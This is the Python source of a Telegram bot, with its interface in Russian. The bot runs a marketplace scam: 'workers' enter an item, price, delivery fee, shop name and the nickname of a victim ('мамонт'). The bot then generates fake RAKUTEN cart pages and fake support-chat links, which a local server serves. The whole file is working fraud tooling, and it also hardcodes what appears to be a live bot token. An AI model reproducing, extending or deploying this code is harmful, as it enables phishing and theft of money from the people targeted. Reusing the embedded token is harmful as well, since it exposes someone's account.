import telebot
from telebot import types
import uuid
import urllib.parse
import datetime
import requests

print("Начало выполнения скрипта bot.py")

# Инициализация бота с вашим токеном
BOT_TOKEN = '7712513191:AAE5qeBjPw7f8FP93SCCwhj1ZKzgMJCoDDk'
bot = telebot.TeleBot(BOT_TOKEN)

user_states = {}

user_links = {}

def create_keyboard(buttons, resize=True, one_time=False):
    markup = types.ReplyKeyboardMarkup(resize_keyboard=resize, one_time_keyboard=one_time)
    for button in buttons:
        markup.add(types.KeyboardButton(button))
    return markup

def main_menu_keyboard():
    return create_keyboard(["создать ссылку", "мои ссылки", "Чат воркеров"])

def cancel_keyboard():
    return create_keyboard(["Отмена."])

def status_keyboard():
    return create_keyboard(["Neuf", "CommeNuef", "Отмена."])

def my_links_keyboard(user_id):
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=False)
    if user_id in user_links and user_links[user_id]:
        for idx, (link_id, info) in enumerate(user_links[user_id].items(), start=1):
            button_text = f"№{idx} {info['product_name']} | {info['listing_amount']} | {link_id}"
            markup.add(types.KeyboardButton(button_text))
    else:
        markup.add(types.KeyboardButton("Нет созданных ссылок"))
    markup.add(types.KeyboardButton("Назад"))
    return markup

def link_detail_keyboard():
    return create_keyboard(["получить ТП", "Удалить", "изменить", "Назад"])

def generate_link_id():
    return str(uuid.uuid4())[:8]

# Обработка команды /start
@bot.message_handler(commands=['start'])
def send_welcome(message):
    user_id = message.from_user.id
    print(f"Пользователь {user_id} отправил /start")
    user_states[user_id] = {'state': 'main_menu'}
    bot.send_message(
        message.chat.id,
        "Ваше главное меню.",
        reply_markup=main_menu_keyboard()
    )

# Обработка текстовых сообщений
@bot.message_handler(func=lambda message: True)
def handle_message(message):
    user_id = message.from_user.id
    text = message.text.strip()
    print(f"Пользователь {user_id} отправил сообщение: {text}")

    # Если пользователь не в состоянии, вернуться к главному меню
    if user_id not in user_states:
        print(f"Пользователь {user_id} не найден в user_states. Возвращаем главное меню.")
        user_states[user_id] = {'state': 'main_menu'}
        bot.send_message(
            message.chat.id,
            "Ваше главное меню.",
            reply_markup=main_menu_keyboard()
        )
        return

    state = user_states[user_id].get('state')
    print(f"Текущее состояние пользователя {user_id}: {state}")

    # Обработка главного меню
    if state == 'main_menu':
        if text == "создать ссылку":
            user_states[user_id] = {'state': 'awaiting_product_name'}
            print(f"Пользователь {user_id} начал создание ссылки.")
            bot.send_message(
                message.chat.id,
                "Введите название товара:",
                reply_markup=cancel_keyboard()
            )
        elif text == "мои ссылки":
            if user_id in user_links and user_links[user_id]:
                user_states[user_id] = {'state': 'viewing_links'}
                bot.send_message(
                    message.chat.id,
                    "Ваши ссылки:",
                    reply_markup=my_links_keyboard(user_id)
                )
                print(f"Пользователь {user_id} запросил свои ссылки.")
            else:
                bot.send_message(
                    message.chat.id,
                    "У вас пока нет созданных ссылок.",
                    reply_markup=main_menu_keyboard()
                )
                print(f"Пользователь {user_id} не имеет созданных ссылок.")
        elif text == "Чат воркеров":

            bot.send_message(
                message.chat.id,
                "Функция 'Чат воркеров' пока не реализована.",
                reply_markup=main_menu_keyboard()
            )
            print(f"Пользователь {user_id} запросил 'Чат воркеров'.")
        else:
            bot.send_message(
                message.chat.id,
                "Пожалуйста, выберите опцию из меню.",
                reply_markup=main_menu_keyboard()
            )
            print(f"Пользователь {user_id} выбрал несуществующую опцию в главном меню.")

    # Обработка создания ссылки
    elif state == 'awaiting_product_name':
        if text == "Отмена.":
            user_states[user_id] = {'state': 'main_menu'}
            bot.send_message(
                message.chat.id,
                "Вы отменили создание ссылки.",
                reply_markup=main_menu_keyboard()
            )
            print(f"Пользователь {user_id} отменил создание ссылки на этапе названия товара.")
        else:
            product_name = text
            # Сохраняем введенное название товара
            user_states[user_id]['product_name'] = product_name
            user_states[user_id]['state'] = 'awaiting_status'
            bot.send_message(
                message.chat.id,
                "Хорошо, теперь введите/выберите статус товара",
                reply_markup=status_keyboard()
            )
            print(f"Пользователь {user_id} ввел название товара: {product_name}")

    elif state == 'awaiting_status':
        if text == "Отмена.":
            user_states[user_id] = {'state': 'main_menu'}
            bot.send_message(
                message.chat.id,
                "Вы отменили создание ссылки.",
                reply_markup=main_menu_keyboard()
            )
            print(f"Пользователь {user_id} отменил создание ссылки на этапе статуса товара.")
        elif text in ["Neuf", "CommeNuef"]:
            status = text
            user_states[user_id]['status'] = status
            user_states[user_id]['state'] = 'awaiting_listing_amount'
            bot.send_message(
                message.chat.id,
                "Хорошо, теперь введите сумму объявления",
                reply_markup=cancel_keyboard()
            )
            print(f"Пользователь {user_id} выбрал статус товара: {status}")
        else:
            bot.send_message(
                message.chat.id,
                "Пожалуйста, выберите статус товара из доступных опций.",
                reply_markup=status_keyboard()
            )
            print(f"Пользователь {user_id} выбрал несуществующий статус товара.")

    elif state == 'awaiting_listing_amount':
        if text == "Отмена.":
            user_states[user_id] = {'state': 'main_menu'}
            bot.send_message(
                message.chat.id,
                "Вы отменили создание ссылки.",
                reply_markup=main_menu_keyboard()
            )
            print(f"Пользователь {user_id} отменил создание ссылки на этапе суммы объявления.")
        else:
            try:
                listing_amount = float(text)
                user_states[user_id]['listing_amount'] = listing_amount
                user_states[user_id]['state'] = 'awaiting_delivery_amount'
                bot.send_message(
                    message.chat.id,
                    "Хорошо, теперь введите сумму доставки;",
                    reply_markup=cancel_keyboard()
                )
                print(f"Пользователь {user_id} ввел сумму объявления: {listing_amount}")
            except ValueError:
                bot.send_message(
                    message.chat.id,
                    "Пожалуйста, введите корректную сумму объявления.",
                    reply_markup=cancel_keyboard()
                )
                print(f"Пользователь {user_id} ввел некорректную сумму объявления: {text}")

    elif state == 'awaiting_delivery_amount':
        if text == "Отмена.":
            user_states[user_id] = {'state': 'main_menu'}
            bot.send_message(
                message.chat.id,
                "Вы отменили создание ссылки.",
                reply_markup=main_menu_keyboard()
            )
            print(f"Пользователь {user_id} отменил создание ссылки на этапе суммы доставки.")
        else:
            try:
                delivery_amount = float(text)
                user_states[user_id]['delivery_amount'] = delivery_amount
                user_states[user_id]['state'] = 'awaiting_mammont_nick'
                bot.send_message(
                    message.chat.id,
                    "Введите ник мамонта:",
                    reply_markup=cancel_keyboard()
                )
                print(f"Пользователь {user_id} ввел сумму доставки: {delivery_amount}")
            except ValueError:
                bot.send_message(
                    message.chat.id,
                    "Пожалуйста, введите корректную сумму доставки.",
                    reply_markup=cancel_keyboard()
                )
                print(f"Пользователь {user_id} ввел некорректную сумму доставки: {text}")

    elif state == 'awaiting_mammont_nick':
        if text == "Отмена.":
            user_states[user_id] = {'state': 'main_menu'}
            bot.send_message(
                message.chat.id,
                "Вы отменили создание ссылки.",
                reply_markup=main_menu_keyboard()
            )
            print(f"Пользователь {user_id} отменил создание ссылки на этапе ника мамонта.")
        else:
            mammont_nick = text
            user_states[user_id]['mammont_nick'] = mammont_nick
            user_states[user_id]['state'] = 'awaiting_shop_name'
            bot.send_message(
                message.chat.id,
                "Теперь введите название магазина:",
                reply_markup=cancel_keyboard()
            )
            print(f"Пользователь {user_id} ввел ник мамонта: {mammont_nick}")

    elif state == 'awaiting_shop_name':
        if text == "Отмена.":
            user_states[user_id] = {'state': 'main_menu'}
            bot.send_message(
                message.chat.id,
                "Вы отменили создание ссылки.",
                reply_markup=main_menu_keyboard()
            )
            print(f"Пользователь {user_id} отменил создание ссылки на этапе названия магазина.")
        else:
            shop_name = text
            user_states[user_id]['shop_name'] = shop_name
            user_states[user_id]['state'] = 'awaiting_admin_nickname'
            bot.send_message(
                message.chat.id,
                "Введите никнейм администратора ТП.",
                reply_markup=cancel_keyboard()
            )
            print(f"Пользователь {user_id} ввел название магазина: {shop_name}")

    elif state == 'awaiting_admin_nickname':
        if text == "Отмена.":
            user_states[user_id] = {'state': 'main_menu'}
            bot.send_message(
                message.chat.id,
                "Вы отменили создание ссылки.",
                reply_markup=main_menu_keyboard()
            )
            print(f"Пользователь {user_id} отменил создание ссылки на этапе никнейма администратора ТП.")
        else:
            admin_nickname = text
            user_states[user_id]['admin_nickname'] = admin_nickname
            user_states[user_id]['state'] = 'awaiting_photo_link'
            bot.send_message(
                message.chat.id,
                "Теперь отправьте ссылку на фотографию:",
                reply_markup=cancel_keyboard()
            )
            print(f"Пользователь {user_id} ввел никнейм администратора ТП: {admin_nickname}")

    # Обработка завершения создания ссылки
    elif state == 'awaiting_photo_link':
        if text == "Отмена.":
            user_states[user_id] = {'state': 'main_menu'}
            bot.send_message(
                message.chat.id,
                "Вы отменили создание ссылки.",
                reply_markup=main_menu_keyboard()
            )
            print(f"Пользователь {user_id} отменил создание ссылки на этапе ссылки на фотографию.")
        else:
            photo_link = text
            user_states[user_id]['photo_link'] = photo_link
            # Завершение процесса создания ссылки
            link_id = generate_link_id()
            timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            total_cost = user_states[user_id]['listing_amount'] + user_states[user_id]['delivery_amount']

            # Генерация ссылки на корзину
            cart_link = f"http://127.0.0.1:3000/cart.html/{link_id}/"

            # Генерация ссылок на чаты
            encoded_admin_nick = urllib.parse.quote(user_states[user_id]['admin_nickname'])
            encoded_mammont_nick = urllib.parse.quote(user_states[user_id]['mammont_nick'])
            admin_chat_link = f"http://127.0.0.1:3000/admin_chat.html?cid={link_id}&a={encoded_admin_nick}&u={encoded_mammont_nick}"
            mammont_chat_link = f"http://127.0.0.1:3000/user_chat.html?cid={link_id}&a={encoded_admin_nick}&u={encoded_mammont_nick}"

            # Сохранение информации о ссылке
            if user_id not in user_links:
                user_links[user_id] = {}
            user_links[user_id][link_id] = {
                'product_name': user_states[user_id]['product_name'],
                'status': user_states[user_id]['status'],
                'listing_amount': user_states[user_id]['listing_amount'],
                'delivery_amount': user_states[user_id]['delivery_amount'],
                'mammont_nick': user_states[user_id]['mammont_nick'],
                'shop_name': user_states[user_id]['shop_name'],
                'admin_nickname': user_states[user_id]['admin_nickname'],
                'photo_link': user_states[user_id]['photo_link'],
                'timestamp': timestamp,
                'total_cost': total_cost,
                'cart_link': cart_link,
                'admin_chat_link': admin_chat_link,
                'mammont_chat_link': mammont_chat_link
            }

            # Отправка данных корзины на сервер
            cart_data = {
                'link_id': link_id,
                'product_name': user_states[user_id]['product_name'],
                'listing_amount': user_states[user_id]['listing_amount'],
                'delivery_amount': user_states[user_id]['delivery_amount'],
                'mammont_nick': user_states[user_id]['mammont_nick'],
                'shop_name': user_states[user_id]['shop_name'],
                'status': user_states[user_id]['status'],
                'total_cost': total_cost,
                'timestamp': timestamp,
                'photo_link': user_states[user_id]['photo_link'],
                # Добавьте другие необходимые поля
            }

            try:
                response = requests.post('http://127.0.0.1:3000/api/cart', json=cart_data)
                if response.status_code == 201:
                    print('Данные корзины успешно отправлены на сервер')
                else:
                    print('Ошибка при отправке данных корзины на сервер:', response.text)
            except Exception as e:
                print('Исключение при отправке данных корзины на сервер:', e)

            # Отправка информации о ссылке
            info_message = (
                f"📋 Информация о ссылке\n\n"
                f"🆔 ID ссылки: {link_id}\n"
                f"📄 Название: {user_states[user_id]['product_name']}\n"
                f"🦣 Имя мамонта: {user_states[user_id]['mammont_nick']}\n"
                f"🏪 Имя шопа: {user_states[user_id]['shop_name']}\n"
                f"💎 Состояние: {user_states[user_id]['status']}\n"
                f"💶 Стоимость товара: {user_states[user_id]['listing_amount']} €\n"
                f"💶 Стоимость доставки: {user_states[user_id]['delivery_amount']} €\n"
                f"💰 Общая стоимость: {total_cost} €\n\n"
                f"🚸 Сервис: RAKUTEN\n"
                f"⏰ Создана: {timestamp}\n\n"
                f"🧺 Ссылка на корзину: {cart_link}"
            )

            bot.send_message(
                message.chat.id,
                info_message,
                reply_markup=types.ReplyKeyboardRemove()
            )
            print(f"Пользователь {user_id} завершил создание ссылки: {link_id}")

            # Отправка ссылок на чаты
            chat_links_message = (
                f"✅ Чат успешно создан!\n\n"
                f"📌 Админ ТП:\n{admin_chat_link}\n\n"
                f"📌 Мамонт ТП:\n{mammont_chat_link}"
            )

            bot.send_message(
                message.chat.id,
                chat_links_message
            )
            print(f"Пользователь {user_id} получил ссылки на чаты для ссылки: {link_id}")

            # Возвращаем пользователя в главное меню
            user_states[user_id] = {'state': 'main_menu'}
            bot.send_message(
                message.chat.id,
                "Вы возвращены в главное меню.",
                reply_markup=main_menu_keyboard()
            )
            print(f"Пользователь {user_id} возвращён в главное меню после создания ссылки.")

    # Обработка детальной информации о ссылке и действий с ней
    elif state == 'viewing_links':
        if text == "Назад":
            user_states[user_id] = {'state': 'main_menu'}
            bot.send_message(
                message.chat.id,
                "Ваше главное меню.",
                reply_markup=main_menu_keyboard()
            )
            print(f"Пользователь {user_id} вернулся в главное меню из 'мои ссылки'.")
        elif text.startswith("№"):
            # Извлечение link_id из текста кнопки
            try:
                # Ожидаемый формат: "№1 iPhone | 123 | link_id"
                parts = text.split('|')
                if len(parts) >= 3:
                    link_id = parts[-1].strip()
                    if user_id in user_links and link_id in user_links[user_id]:
                        selected_link = user_links[user_id][link_id]
                        user_states[user_id]['state'] = 'viewing_link'
                        user_states[user_id]['current_link_id'] = link_id
                        # Формирование сообщения с информацией о ссылке
                        info_message = (
                            f"📋 Информация о ссылке\n\n"
                            f"🆔 ID ссылки: {link_id}\n"
                            f"📄 Название: {selected_link['product_name']}\n"
                            f"🦣 Имя мамонта: {selected_link['mammont_nick']}\n"
                            f"🏪 Имя шопа: {selected_link['shop_name']}\n"
                            f"💎 Состояние: {selected_link['status']}\n"
                            f"💶 Стоимость товара: {selected_link['listing_amount']} €\n"
                            f"💶 Стоимость доставки: {selected_link['delivery_amount']} €\n"
                            f"💰 Общая стоимость: {selected_link['total_cost']} €\n\n"
                            f"🚸 Сервис: RAKUTEN\n"
                            f"⏰ Создана: {selected_link['timestamp']}\n\n"
                            f"🧺 Ссылка на корзину: {selected_link['cart_link']}"
                        )
                        bot.send_message(
                            message.chat.id,
                            info_message,
                            reply_markup=link_detail_keyboard()
                        )
                        print(f"Пользователь {user_id} запросил подробную информацию о ссылке: {link_id}")
                    else:
                        bot.send_message(
                            message.chat.id,
                            "Ссылка не найдена.",
                            reply_markup=my_links_keyboard(user_id)
                        )
                        print(f"Пользователь {user_id} попытался просмотреть несуществующую ссылку: {link_id}")
                else:
                    bot.send_message(
                        message.chat.id,
                        "Неправильный формат выбора ссылки.",
                        reply_markup=my_links_keyboard(user_id)
                    )
                    print(f"Пользователь {user_id} отправил некорректный формат кнопки ссылки: {text}")
            except Exception as e:
                bot.send_message(
                    message.chat.id,
                    "Произошла ошибка при обработке вашей ссылки.",
                    reply_markup=my_links_keyboard(user_id)
                )
                print(f"Ошибка при обработке ссылки пользователя {user_id}: {e}")
        else:
            bot.send_message(
                message.chat.id,
                "Пожалуйста, выберите ссылку или нажмите 'Назад'.",
                reply_markup=my_links_keyboard(user_id)
            )
            print(f"Пользователь {user_id} отправил неизвестную команду в 'мои ссылки': {text}")

    elif state == 'viewing_link':
        current_link_id = user_states[user_id].get('current_link_id')
        if text == "Назад":
            user_states[user_id] = {'state': 'viewing_links'}
            bot.send_message(
                message.chat.id,
                "Ваши ссылки:",
                reply_markup=my_links_keyboard(user_id)
            )
            print(f"Пользователь {user_id} вернулся к списку ссылок из детальной информации.")
        elif text == "Удалить":
            if user_id in user_links and current_link_id in user_links[user_id]:
                del user_links[user_id][current_link_id]
                user_states[user_id] = {'state': 'viewing_links'}
                bot.send_message(
                    message.chat.id,
                    "Ссылка успешно удалена.",
                    reply_markup=my_links_keyboard(user_id)
                )
                print(f"Пользователь {user_id} удалил ссылку: {current_link_id}")
            else:
                bot.send_message(
                    message.chat.id,
                    "Ссылка не найдена или уже удалена.",
                    reply_markup=my_links_keyboard(user_id)
                )
                print(f"Пользователь {user_id} попытался удалить несуществующую ссылку: {current_link_id}")
        elif text == "получить ТП":
            if user_id in user_links and current_link_id in user_links[user_id]:
                selected_link = user_links[user_id][current_link_id]
                # Получаем сохранённые ссылки на чаты
                admin_chat_link = selected_link['admin_chat_link']
                mammont_chat_link = selected_link['mammont_chat_link']

                chat_links_message = (
                    f"✅ Чат успешно создан!\n\n"
                    f"📌 Админ ТП:\n{admin_chat_link}\n\n"
                    f"📌 Мамонт ТП:\n{mammont_chat_link}"
                )

                bot.send_message(
                    message.chat.id,
                    chat_links_message,
                    reply_markup=link_detail_keyboard()
                )
                print(f"Пользователь {user_id} получил ссылки на чаты для ссылки: {current_link_id}")
            else:
                bot.send_message(
                    message.chat.id,
                    "Ссылка не найдена.",
                    reply_markup=my_links_keyboard(user_id)
                )
                print(f"Пользователь {user_id} попытался получить ТП для несуществующей ссылки: {current_link_id}")
        elif text == "изменить":
            # Начинаем процесс редактирования ссылки
            user_states[user_id]['state'] = 'editing_product_name'
            selected_link = user_links[user_id][current_link_id]
            bot.send_message(
                message.chat.id,
                f"Введите новое название товара (текущее: {selected_link['product_name']}):",
                reply_markup=cancel_keyboard()
            )
            print(f"Пользователь {user_id} начал редактирование ссылки: {current_link_id}")
        else:
            bot.send_message(
                message.chat.id,
                "Пожалуйста, выберите действие или нажмите 'Назад'.",
                reply_markup=link_detail_keyboard()
            )
            print(f"Пользователь {user_id} отправил неизвестную команду в детальной информации: {text}")

    # Обработка редактирования ссылки
    elif state == 'editing_product_name':
        current_link_id = user_states[user_id].get('current_link_id')
        if text == "Отмена.":
            user_states[user_id]['state'] = 'viewing_link'
            bot.send_message(
                message.chat.id,
                "Редактирование отменено.",
                reply_markup=link_detail_keyboard()
            )
            print(f"Пользователь {user_id} отменил редактирование ссылки: {current_link_id}")
        else:
            # Обновляем название товара
            user_links[user_id][current_link_id]['product_name'] = text
            user_states[user_id]['state'] = 'editing_status'
            bot.send_message(
                message.chat.id,
                f"Введите/выберите новый статус товара (текущий: {user_links[user_id][current_link_id]['status']}):",
                reply_markup=status_keyboard()
            )
            print(f"Пользователь {user_id} обновил название товара для ссылки {current_link_id}")

    elif state == 'editing_status':
        current_link_id = user_states[user_id].get('current_link_id')
        if text == "Отмена.":
            user_states[user_id]['state'] = 'viewing_link'
            bot.send_message(
                message.chat.id,
                "Редактирование отменено.",
                reply_markup=link_detail_keyboard()
            )
            print(f"Пользователь {user_id} отменил редактирование статуса для ссылки: {current_link_id}")
        elif text in ["Neuf", "CommeNuef"]:
            user_links[user_id][current_link_id]['status'] = text
            user_states[user_id]['state'] = 'editing_listing_amount'
            bot.send_message(
                message.chat.id,
                f"Введите новую сумму объявления (текущая: {user_links[user_id][current_link_id]['listing_amount']}):",
                reply_markup=cancel_keyboard()
            )
            print(f"Пользователь {user_id} обновил статус товара для ссылки {current_link_id}")
        else:
            bot.send_message(
                message.chat.id,
                "Пожалуйста, выберите статус товара из доступных опций.",
                reply_markup=status_keyboard()
            )

    elif state == 'editing_listing_amount':
        current_link_id = user_states[user_id].get('current_link_id')
        if text == "Отмена.":
            user_states[user_id]['state'] = 'viewing_link'
            bot.send_message(
                message.chat.id,
                "Редактирование отменено.",
                reply_markup=link_detail_keyboard()
            )
            print(f"Пользователь {user_id} отменил редактирование суммы объявления для ссылки: {current_link_id}")
        else:
            try:
                listing_amount = float(text)
                user_links[user_id][current_link_id]['listing_amount'] = listing_amount
                user_states[user_id]['state'] = 'editing_delivery_amount'
                bot.send_message(
                    message.chat.id,
                    f"Введите новую сумму доставки (текущая: {user_links[user_id][current_link_id]['delivery_amount']}):",
                    reply_markup=cancel_keyboard()
                )
                print(f"Пользователь {user_id} обновил сумму объявления для ссылки {current_link_id}")
            except ValueError:
                bot.send_message(
                    message.chat.id,
                    "Пожалуйста, введите корректную сумму объявления.",
                    reply_markup=cancel_keyboard()
                )

    elif state == 'editing_delivery_amount':
        current_link_id = user_states[user_id].get('current_link_id')
        if text == "Отмена.":
            user_states[user_id]['state'] = 'viewing_link'
            bot.send_message(
                message.chat.id,
                "Редактирование отменено.",
                reply_markup=link_detail_keyboard()
            )
            print(f"Пользователь {user_id} отменил редактирование суммы доставки для ссылки: {current_link_id}")
        else:
            try:
                delivery_amount = float(text)
                user_links[user_id][current_link_id]['delivery_amount'] = delivery_amount
                user_states[user_id]['state'] = 'editing_mammont_nick'
                bot.send_message(
                    message.chat.id,
                    f"Введите новый ник мамонта (текущий: {user_links[user_id][current_link_id]['mammont_nick']}):",
                    reply_markup=cancel_keyboard()
                )
                print(f"Пользователь {user_id} обновил сумму доставки для ссылки {current_link_id}")
            except ValueError:
                bot.send_message(
                    message.chat.id,
                    "Пожалуйста, введите корректную сумму доставки.",
                    reply_markup=cancel_keyboard()
                )

    elif state == 'editing_mammont_nick':
        current_link_id = user_states[user_id].get('current_link_id')
        if text == "Отмена.":
            user_states[user_id]['state'] = 'viewing_link'
            bot.send_message(
                message.chat.id,
                "Редактирование отменено.",
                reply_markup=link_detail_keyboard()
            )
            print(f"Пользователь {user_id} отменил редактирование ника мамонта для ссылки: {current_link_id}")
        else:
            user_links[user_id][current_link_id]['mammont_nick'] = text
            user_states[user_id]['state'] = 'editing_shop_name'
            bot.send_message(
                message.chat.id,
                f"Введите новое название магазина (текущее: {user_links[user_id][current_link_id]['shop_name']}):",
                reply_markup=cancel_keyboard()
            )
            print(f"Пользователь {user_id} обновил ник мамонта для ссылки {current_link_id}")

    elif state == 'editing_shop_name':
        current_link_id = user_states[user_id].get('current_link_id')
        if text == "Отмена.":
            user_states[user_id]['state'] = 'viewing_link'
            bot.send_message(
                message.chat.id,
                "Редактирование отменено.",
                reply_markup=link_detail_keyboard()
            )
            print(f"Пользователь {user_id} отменил редактирование названия магазина для ссылки: {current_link_id}")
        else:
            user_links[user_id][current_link_id]['shop_name'] = text
            user_states[user_id]['state'] = 'editing_admin_nickname'
            bot.send_message(
                message.chat.id,
                f"Введите новый никнейм администратора ТП (текущий: {user_links[user_id][current_link_id]['admin_nickname']}):",
                reply_markup=cancel_keyboard()
            )
            print(f"Пользователь {user_id} обновил название магазина для ссылки {current_link_id}")

    elif state == 'editing_admin_nickname':
        current_link_id = user_states[user_id].get('current_link_id')
        if text == "Отмена.":
            user_states[user_id]['state'] = 'viewing_link'
            bot.send_message(
                message.chat.id,
                "Редактирование отменено.",
                reply_markup=link_detail_keyboard()
            )
            print(f"Пользователь {user_id} отменил редактирование никнейма администратора ТП для ссылки: {current_link_id}")
        else:
            user_links[user_id][current_link_id]['admin_nickname'] = text
            user_states[user_id]['state'] = 'editing_photo_link'
            bot.send_message(
                message.chat.id,
                f"Введите новую ссылку на фотографию (текущая: {user_links[user_id][current_link_id]['photo_link']}):",
                reply_markup=cancel_keyboard()
            )
            print(f"Пользователь {user_id} обновил никнейм администратора ТП для ссылки {current_link_id}")

    elif state == 'editing_photo_link':
        current_link_id = user_states[user_id].get('current_link_id')
        if text == "Отмена.":
            user_states[user_id]['state'] = 'viewing_link'
            bot.send_message(
                message.chat.id,
                "Редактирование отменено.",
                reply_markup=link_detail_keyboard()
            )
            print(f"Пользователь {user_id} отменил редактирование ссылки на фотографию для ссылки: {current_link_id}")
        else:
            user_links[user_id][current_link_id]['photo_link'] = text
            # Обновляем timestamp и total_cost
            user_links[user_id][current_link_id]['timestamp'] = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            user_links[user_id][current_link_id]['total_cost'] = user_links[user_id][current_link_id]['listing_amount'] + user_links[user_id][current_link_id]['delivery_amount']
            # Генерируем новые ссылки на чаты, если изменились никнеймы
            encoded_admin_nick = urllib.parse.quote(user_links[user_id][current_link_id]['admin_nickname'])
            encoded_mammont_nick = urllib.parse.quote(user_links[user_id][current_link_id]['mammont_nick'])
            link_id = current_link_id
            user_links[user_id][current_link_id]['admin_chat_link'] = f"http://127.0.0.1:3000/admin_chat.html?cid={link_id}&a={encoded_admin_nick}&u={encoded_mammont_nick}"
            user_links[user_id][current_link_id]['mammont_chat_link'] = f"http://127.0.0.1:3000/user_chat.html?cid={link_id}&a={encoded_admin_nick}&u={encoded_mammont_nick}"
            # Возвращаемся к просмотру обновленной ссылки
            user_states[user_id]['state'] = 'viewing_link'
            bot.send_message(
                message.chat.id,
                "Ссылка успешно обновлена.",
                reply_markup=link_detail_keyboard()
            )
            print(f"Пользователь {user_id} завершил редактирование ссылки: {current_link_id}")

    else:
        # Обработка неизвестного состояния
        user_states[user_id] = {'state': 'main_menu'}
        bot.send_message(
            message.chat.id,
            "Произошла ошибка. Вы возвращены в главное меню.",
            reply_markup=main_menu_keyboard()
        )
        print(f"Пользователь {user_id} попал в неизвестное состояние: {state}")

# Блок запуска бота
if __name__ == "__main__":
    print("Бот запущен...")
    try:
        bot.polling(none_stop=True)
    except Exception as e:
        print(f"Произошла ошибка: {e}")
